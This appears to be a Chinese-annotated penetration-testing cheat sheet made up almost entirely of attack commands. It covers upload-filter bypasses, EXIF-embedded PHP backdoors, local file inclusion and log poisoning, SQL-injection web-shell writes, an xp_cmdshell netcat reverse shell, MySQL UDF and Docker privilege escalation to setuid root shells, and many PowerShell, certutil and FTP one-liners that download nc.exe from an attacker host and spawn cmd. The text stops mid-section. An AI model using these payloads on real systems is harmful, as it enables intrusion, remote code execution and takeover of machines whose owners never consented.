  * file.asp -> file.asp;.jpg
  * file.gif (contains php code, but starts with string GIF/GIF98)
  * 00%
  * file.jpg with php backdoor in exif (see below)
  * .jpg -> proxy intercept -> rename to .php
### 图片里面注入Code
    exiv2 -c'A ""!' backdoor.jpeg
    exiftool “-comment HTTP/1.1
    Host: 192.168.1.102
    Connection: close
    # Then send as cmd payload via http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
### 本地文件包含到任意文件读取
玩坏的了，备忘录嘛。
    file:///etc/passwd
    http://example.com/index.php?page=php://input&cmd=ls
        POST: 
    http://192.168.2.237/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
        POST: 
    expect://whoami
    http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
    http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
    http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
    http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=id
    http://10.1.1.1/index.php?page=data://text/plain,%3C?php%20system%28%22uname%20-a%22%29;%20?%3E
    # ZIP Wrapper
    echo "" > payload.php;  
    zip payload.zip payload.php;   
    mv payload.zip shell.jpg;    
    http://example.com/index.php?page=zip://shell.jpg%23payload.php
    # Loop through file descriptors
    curl '' -H 'Cookie: PHPSESSID=df74dce800c96bcac1f59d3b3d42087d' --output -
### Windows + PHP
ps：
    cmd /c dir 是执行完dir命令后关闭命令窗口。
    cmd /k dir 是执行完dir命令后不关闭命令窗口。
    cmd /c start dir 会打开一个新窗口后执行dir指令，原窗口会关闭。
    cmd /k start dir 会打开一个新窗口后执行dir指令，原窗口不会关闭。
### 利用好Sql注入
    # Assumed 3 columns
    http://target/index.php?vulnParam=0' UNION ALL SELECT 1,"",2,3 INTO OUTFILE "c:/evil.php"-- uMj
    # sqlmap; post-request - captured request via Burp Proxy via Save Item to File.
    sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10
    # sqlmap; post-request - captured request via Burp Proxy via Save Item to File.
    sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10
xp_cmdshell
    # netcat reverse shell via mssql injection when xp_cmdshell is available
    1000';+exec+master.dbo.xp_cmdshell+'(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+>+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd';--
### SQLite
    ATTACH DATABASE '/home/www/public_html/uploads/phpinfo.php' as pwn; 
    CREATE TABLE pwn.shell (code TEXT); 
    INSERT INTO pwn.shell (code) VALUES ('');
### MS-SQL Console
    mssqlclient.py -port 27900 user:password@10.1.1.1
    sqsh -S 10.1.1.1 -U user -P password
### 无交互式Shell
    python -c 'import pty; pty.spawn("/bin/sh")'
    /bin/busybox sh
### Python代码执行
    __import__('os').system('id')
### Local Enumeration & Privilege Escalation
我做了一个中文版的。
#### ImmunityDebugger
### Get Loaded Modules
    !mona modules
#### JMP ESP地址
    !mona find -s "\xFF\xE4" -m moduleName
### 破zip密码
    fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
### Simple HTTP server
    # Linux
    python -m SimpleHTTPServer 80
    python3 -m http.server
    ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
    php -S 0.0.0.0:80
### Mysql提权
需要
    raptor_udf2.c and sid-shell.c or full tarball
地址失效了，我联系作者补一下。
    gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
    use mysql;
    create table npn(line blob);
    insert into npn values(load_file('/tmp/raptor_udf2.so'));
    select * from npn into dumpfile '/usr/lib/raptor_udf2.so';
    create function do_system returns integer soname 'raptor_udf2.so';
    select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell');
### Docker提权
    echo -e "FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh
#### 重置root用户密码
    echo "root:spotless" | chpasswd
## 上传文件到目标上
### TFTP
    #TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
    service atftpd start
    # Windows
    tftp -i $ATTACKER get /download/location/file /save/location/file
### FTP
    # Linux: set up ftp server with anonymous logon access;
    twistd -n ftp -p 21 -r /file/to/serve
    # Windows shell: read FTP commands from ftp-commands.txt non-interactively;
    echo open $ATTACKER>ftp-commands.txt
    echo anonymous>>ftp-commands.txt
    echo whatever>>ftp-commands.txt
    echo binary>>ftp-commands.txt
    echo get file.exe>>ftp-commands.txt
    echo bye>>ftp-commands.txt 
    ftp -s:ftp-commands.txt
    # Or just a one-liner
    (echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
### CertUtil
    certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
### PHP
### Python
    python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
### HTTP: Powershell
    powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
    powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
    powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe')"; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'"
    powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');(New-Object -com Shell.Application).ShellExecute('file.exe');
    # download using default proxy credentials and launch
    powershell -command { $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString("http://$attacker/nc.exe") | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
### HTTP: VBScript
    https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/wget-cscript
    cscript wget.vbs http://$ATTACKER/file.exe localfile.exe
### HTTP: Linux
    wget http://$ATTACKER/file
    curl http://$ATTACKER/file -O
    scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
### Netcat
    # Attacker
    nc -l -p 4444 < /tool/file.exe
    # Victim